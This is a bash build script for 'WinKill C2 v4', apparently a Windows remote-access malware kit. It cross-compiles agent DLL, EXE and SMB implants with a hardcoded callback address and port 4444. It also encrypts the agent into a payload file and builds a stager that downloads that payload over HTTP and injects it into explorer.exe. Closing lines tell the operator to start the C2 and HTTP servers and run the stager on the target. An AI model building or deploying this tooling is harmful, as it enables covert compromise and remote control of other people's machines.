#!/bin/bash
# WinKill C2 v4 Builder (Linux cross-compile)
# Usage: ./build.sh [C2_IP] [C2_PORT] [HTTP_IP] [HTTP_PORT] [TARGET_PROC]
C2_IP="${1:-192.168.102.167}"; C2_PORT="${2:-4444}"
HTTP_IP="${3:-$C2_IP}"; HTTP_PORT="${4:-8080}"
TARGET="${5:-explorer.exe}"
IPHEX=$(python3 -c "import socket,struct;print(hex(struct.unpack('<I',socket.inet_aton('$C2_IP'))[0]))" 2>/dev/null || python -c "import socket,struct;print(hex(struct.unpack('<I',socket.inet_aton('$C2_IP'))[0]))")
GCC="${GCC:-x86_64-w64-mingw32-gcc}"
echo "============================================"
echo "  WinKill C2 v4 Builder"
echo "  C2: $C2_IP:$C2_PORT  HTTP: $HTTP_IP:$HTTP_PORT"
echo "  Target: $TARGET"
echo "============================================"
set -e
echo "[1/6] agent.dll..."
$GCC -O2 -s -m64 -shared -fno-ident -DC2_IP=$IPHEX -DC2_PORT=$C2_PORT -o agent.dll agent_source.c -lws2_32 -lwldap32 -ladvapi32 -lnetapi32
echo "[2/6] agent.exe..."
$GCC -O2 -s -m64 -fno-ident -DC2_IP=$IPHEX -DC2_PORT=$C2_PORT -o agent.exe agent_exe_source.c -lws2_32 -lwldap32 -ladvapi32 -lnetapi32
echo "[3/6] encrypt.exe + payload.bin..."
$GCC -O2 -s -m64 -fno-ident -o encrypt.exe encrypt_source.c
wine ./encrypt.exe agent.dll 2>/dev/null || ./encrypt.exe agent.dll 2>/dev/null
cp agent.dll.enc payload.bin
echo "[4/6] stager.exe..."
echo "#define DEFAULT_URL_HOST \"$HTTP_IP\"" > _stager_cfg.h
echo "#define DEFAULT_URL_PORT \"$HTTP_PORT\"" >> _stager_cfg.h
echo "#define DEFAULT_TARGET \"$TARGET\"" >> _stager_cfg.h
$GCC -O2 -s -m64 -fno-ident -o stager.exe stager.c -lwinhttp
rm -f _stager_cfg.h
echo "[5/6] injector_enc.exe..."
$GCC -O2 -s -m64 -fno-ident -o injector_enc.exe injector_enc_source.c
echo "[6/6] agent_smb.exe..."
$GCC -O2 -s -m64 -fno-ident -o agent_smb.exe agent_smb_source.c -lws2_32 -lwldap32 -ladvapi32 -lnetapi32
echo ""
echo "Done!"
echo "  Server:  python3 c2_server.py 0.0.0.0 $C2_PORT"
echo "  HTTP:    python3 -m http.server $HTTP_PORT"
echo "  Target:  stager.exe (no args)"
ls -la agent.dll agent.exe stager.exe payload.bin c2_server.py
